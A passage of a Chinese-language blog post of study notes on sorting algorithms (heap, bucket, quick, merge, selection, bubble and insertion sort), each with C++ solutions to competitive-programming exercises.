class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//这里填你的代码^^</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> h[N],tt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t=x;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x&lt;=tt&amp;&amp;h[<span class="hljs-number">2</span>*x]&lt;h[t]) t=<span class="hljs-number">2</span>*x;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>&lt;=tt&amp;&amp;h[<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>]&lt;h[t]) t=<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>;<span class="hljs-comment">//算出自己和自己的儿子谁小</span><br>    <span class="hljs-keyword">if</span>(t!=x)<span class="hljs-comment">//如果自己的儿子比自己小，就交换数值，并且递归让自己到达正确的位置</span><br>    &#123;<br>        <span class="hljs-built_in">swap</span>(h[x],h[t]);<br>        <span class="hljs-built_in">down</span>(t);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    tt=n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;h[i];<span class="hljs-comment">//输入是无序的</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n/<span class="hljs-number">2</span>;i&gt;<span class="hljs-number">0</span>;i--) <span class="hljs-built_in">down</span>(i);<span class="hljs-comment">//为啥创建堆时权重是从n/2开始，因为最后一层不用进行堆的排序</span><br>    <span class="hljs-comment">//要从最后一层的上一层开始，而父亲和儿子的权重关系是i(父亲)=i(儿子)*2</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>    &#123;<br>        cout&lt;&lt;h[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<span class="hljs-comment">//最小的数，就是堆权重最小的数</span><br>        h[<span class="hljs-number">1</span>]=h[tt--];<span class="hljs-comment">//因为数组删除第一个元素时很困难的，所以直接将堆最后一位赋值到第一位</span><br>        <span class="hljs-built_in">down</span>(<span class="hljs-number">1</span>);<span class="hljs-comment">//然后再判断该数是否在正确的位置</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//注意代码要放在两组三个点之间，才可以正确显示代码高亮哦~</span><br></code></pre></td></tr></table></figure><h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><p>桶排序可以解决数据过多导致超时的情况，也可以计算计算得票数量类的题型</p><p>整个过程：</p><p><img src="https://s2.loli.net/2022/01/23/oADHGJ94uVLsKUp.png" alt="image-20220123164040471"></p><p>例题：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">为了找出林大2020新生中最擅长编写代码的同学，学校发起了一场投票。通过同学报名、前期遴选等环节，共提名了100名同学作为选举人进行评选，假设他们的编号从1到100。现在学院已经采集到了n名同学的投票结果，请你找出得票最多的程序员获得的票数(注：就是让你找相同数字的个数的最大值)。<br>输入样例1：<br>6<br>1<span class="hljs-number"> 2 </span>4<span class="hljs-number"> 7 </span>7 7<br>4<br>5<span class="hljs-number"> 5 </span>5 5<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> a[<span class="hljs-number">200</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,t;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(a,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(a));<span class="hljs-comment">//将数组初始化为0</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<span class="hljs-comment">//进行桶排序</span><br>            cin&gt;&gt;t;<br>            a[t]++;<br>        &#125;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">100</span>;i++) ans=<span class="hljs-built_in">max</span>(ans,a[i]);<span class="hljs-comment">//运用了max函数，max(a,b)函数会返回大的数</span><br>        cout&lt;&lt;ans&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">785</span>.快速排序<br><br>给定你一个长度为 <span class="hljs-built_in">n</span> 的整数数列。<br><br>请你使用快速排序对这个数列按照从小到大进行排序。<br><br>并将排好序的数列按顺序输出。<br><br>输入格式<br>输入共两行，第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（所有整数均在 <span class="hljs-number">1</span>∼<span class="hljs-number">109</span> 范围内），表示整个数列。<br><br>输出格式<br>输出共一行，包含 <span class="hljs-built_in">n</span> 个整数，表示排好序的数列。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">100000</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N];<br><br><span class="hljs-comment">//模板</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[],<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span>;<span class="hljs-comment">//递归结束条件</span><br>    <span class="hljs-type">int</span> i=l<span class="hljs-number">-1</span>,j=r+<span class="hljs-number">1</span>,x=a[l+r&gt;&gt;<span class="hljs-number">1</span>];<span class="hljs-comment">//为什么要-1,因为在循环的时候会先加一</span><br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i++;<span class="hljs-keyword">while</span>(a[i]&lt;x);<span class="hljs-comment">//找到大于中间值的量</span><br>        <span class="hljs-keyword">do</span> j--;<span class="hljs-keyword">while</span>(a[j]&gt;x);<span class="hljs-comment">//找到小于中间值的量</span><br>        <span class="hljs-keyword">if</span>(i&lt;j) <span class="hljs-built_in">swap</span>(a[i],a[j]);<span class="hljs-comment">//如果i&lt;j,就交换两个值</span><br>    &#125;<br>    <span class="hljs-built_in">quick_sort</span>(a,l,j);<span class="hljs-comment">//进行二分递归</span><br>    <span class="hljs-built_in">quick_sort</span>(a,j+<span class="hljs-number">1</span>,r);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>    <span class="hljs-built_in">quick_sort</span>(a,<span class="hljs-number">0</span>,n<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) i==n<span class="hljs-number">-1</span>?cout&lt;&lt;a[i]&lt;&lt;endl:cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">787</span>.归并排序<br><br>给定你一个长度为 <span class="hljs-built_in">n</span> 的整数数列。<br><br>请你使用归并排序对这个数列按照从小到大进行排序。<br><br>并将排好序的数列按顺序输出。<br><br>输入格式<br>输入共两行，第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（所有整数均在 <span class="hljs-number">1</span>∼<span class="hljs-number">109</span> 范围内），表示整个数列。<br><br>输出格式<br>输出共一行，包含 <span class="hljs-built_in">n</span> 个整数，表示排好序的数列。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">100000</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> q[N],tmp[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span>;<span class="hljs-comment">//递归结束条件</span><br>    <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">merge_sort</span>(l,mid),<span class="hljs-built_in">merge_sort</span>(mid+<span class="hljs-number">1</span>,r);<span class="hljs-comment">//递归二分到最小单元</span><br>    <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>,i=l,j=mid+<span class="hljs-number">1</span>;<span class="hljs-comment">//两个数组部分的第一个元素</span><br>    <span class="hljs-keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=r)<span class="hljs-comment">//没有超过两个数组部分的最后一个位置</span><br>    &#123;<br>        <span class="hljs-comment">//有序合并两个数组</span><br>        <span class="hljs-keyword">if</span>(q[i]&lt;q[j]) tmp[k++]=q[i++];<br>        <span class="hljs-keyword">else</span> tmp[k++]=q[j++];<br>    &#125;<br>    <span class="hljs-keyword">while</span>(i&lt;=mid) tmp[k++]=q[i++];<span class="hljs-comment">//如果还有剩余部分没有合并，就直接接上去</span><br>    <span class="hljs-keyword">while</span>(j&lt;=r) tmp[k++]=q[j++];<br>    <span class="hljs-keyword">for</span>(k=<span class="hljs-number">0</span>,i=l;i&lt;=r;i++,k++) q[i]=tmp[k];<span class="hljs-comment">//将有序的数组还原回原数组的对应位置，注意时对应位置</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;q[i];<br>    <span class="hljs-built_in">merge_sort</span>(<span class="hljs-number">0</span>,n<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) i==n<span class="hljs-number">-1</span>?cout&lt;&lt;q[i]&lt;&lt;endl:cout&lt;&lt;q[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="选择排序O-N-2"><a href="#选择排序O-N-2" class="headerlink" title="选择排序O(N^2)"></a>选择排序O(N^2)</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">787</span>.归并排序<br><br>给定你一个长度为 <span class="hljs-built_in">n</span> 的整数数列。<br><br>请你使用归并排序对这个数列按照从小到大进行排序。<br><br>并将排好序的数列按顺序输出。<br><br>输入格式<br>输入共两行，第一行包含整数 <span class="hljs-built_in">n</span>。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数（所有整数均在 <span class="hljs-number">1</span>∼<span class="hljs-number">109</span> 范围内），表示整个数列。<br><br>输出格式<br>输出共一行，包含 <span class="hljs-built_in">n</span> 个整数，表示排好序的数列。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">100000</span><br>输入样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br>输出样例：<br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>;<br><span class="hljs-type">int</span> a[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-type">int</span> n;<br>   cin&gt;&gt;n;<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-1</span>;i++)<br>   &#123;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;n;j++)<br>     &#123;<br>       <span class="hljs-keyword">if</span>(a[i]&gt;a[j]) <span class="hljs-built_in">swap</span>(a[i],a[j]); <br>     &#125;<br>   &#125;<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot;　&quot;</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 1000;</span><br><span class="hljs-type">int</span> a[<span class="hljs-number">1000</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bubble_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-type">bool</span> flag=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n-i;j++)&#123;<br>            <span class="hljs-keyword">if</span>(a[j]&gt;a[j+<span class="hljs-number">1</span>])&#123;<br>                <span class="hljs-built_in">swap</span>(a[j],a[j+<span class="hljs-number">1</span>]);<br>                flag=<span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag) <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data)!=EOF)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!data)&#123;<br>            n--;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> a[n++]=data;<br>    &#125;<br>    <span class="hljs-built_in">bubble_sort</span>(n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="直接插入算法"><a href="#直接插入算法" class="headerlink" title="直接插入算法"></a>直接插入算法</h2><p><strong>算法核心</strong></p><p>从第二个元素开始，一旦有元素a[j-1]&gt;a[j],那么就需要调整顺序。</p><p>先将a[j]存储到a[0],然后将a[j]&#x3D;a[j-1],接着从j-2后往前比对，如果a[j]&gt;a[0],那么就将a[j+1]&#x3D;a[j],如果a[j]&lt;&#x3D;a[0],那么a[j+1]&#x3D;a[0],结束本轮循环。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//直接插入排序算法</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 1000;</span><br><span class="hljs-type">int</span> a[<span class="hljs-number">1000</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DirectInsertSort</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i]&lt;a[i<span class="hljs-number">-1</span>])<br>        &#123;<br>            a[<span class="hljs-number">0</span>]=a[i];<br>            a[i]=a[i<span class="hljs-number">-1</span>];<br>            <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-2</span>;a[<span class="hljs-number">0</span>]&lt;a[j];j--) a[j+<span class="hljs-number">1</span>]=a[j];<br>            a[j+<span class="hljs-number">1</span>]=a[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data)!=EOF)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!data)&#123;<br>            n--;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> a[n++]=data;<br>    &#125;<br>    <span class="hljs-built_in">DirectInsertSort</span>(n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二进制枚举"><a href="#二进制枚举" class="headerlink" title="二进制枚举"></a>二进制枚举</h1><p><a 